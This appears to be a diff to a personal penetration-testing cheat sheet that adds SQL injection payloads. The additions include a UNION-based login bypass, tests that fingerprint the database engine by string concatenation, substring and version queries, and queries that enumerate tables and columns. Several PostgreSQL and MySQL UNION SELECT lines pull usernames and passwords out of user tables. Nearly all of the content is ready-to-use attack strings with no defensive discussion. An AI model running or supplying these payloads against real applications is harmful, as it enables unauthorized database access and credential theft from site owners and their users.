@@ -90,7 +90,7 @@ search[$ne]=string #mongodb
 ```
 ## payloads
 ```sql
-username=gfd'+union+select+'password'+--+-&password=password      '
+username='gfd'+union+select+'password'+--+-&password=password
 
 ?id=2 and 'foo' 'bar' = 'foobar'     # mysql
 ?id=2 and 'foo'+'bar'='foobar'       # mssql
@@ -98,10 +98,35 @@ username=gfd'+union+select+'password'+--+-&password=password      '
 ?id=2 and lengthb('foo') = 3         # oracle
 not previous                         # sqlite
 
+SUBSTR('foobar', 4, 2)    #Oracle
+SUBSTRING('foobar', 4, 2) #Microsoft
+SUBSTRING('foobar', 4, 2) #PostgreSQL
+SUBSTRING('foobar', 4, 2) #MySQL
 
-' '  => mysql
-'+'  => mssql
-'||' => postgres, sqlite, oracle
+SELECT banner FROM v$version   #oracle
+SELECT version FROM v$instance #oracle
+SELECT @@version               #mssql mysql
+SELECT version()               #postgresql
+
++UNION+SELECT+BANNER,+NULL+FROM+v$version-- # oracle
+```
+### database contents
+```sql
+Oracle
+SELECT * FROM all_tables
+SELECT * FROM all_tab_columns WHERE table_name = 'TABLE-NAME-HERE'
+
+Microsoft
+SELECT * FROM information_schema.tables
+SELECT * FROM information_schema.columns WHERE table_name = 'TABLE-NAME-HERE'
+
+PostgreSQL
+SELECT * FROM information_schema.tables
+SELECT * FROM information_schema.columns WHERE table_name = 'TABLE-NAME-HERE'
+
+MySQL
+SELECT * FROM information_schema.tables
+SELECT * FROM information_schema.columns WHERE table_name = 'TABLE-NAME-HERE'
 ```
 ## mysqli
 get version
@@ -124,6 +149,20 @@ get users and passwords:
 ```sql
 UNION SELECT 1,group_concat(username,':',password),3,4 FROM website.users -- - 
 ```
+## postgres
+list of tables in the database:
+```sql
+UNION SELECT table_name, NULL FROM information_schema.tables--
+```
+retrieve the details of the columns in the table:
+```sql
+UNION SELECT column_name, NULL FROM information_schema.columns WHERE table_name='users_etbzqp'--
+```
+retrieve the usernames and passwords for all users:
+```sql
+UNION SELECT username_abcdef, password_abcdef FROM users_abcdef--
+```
+## oracle
 
 ---
 # ssti
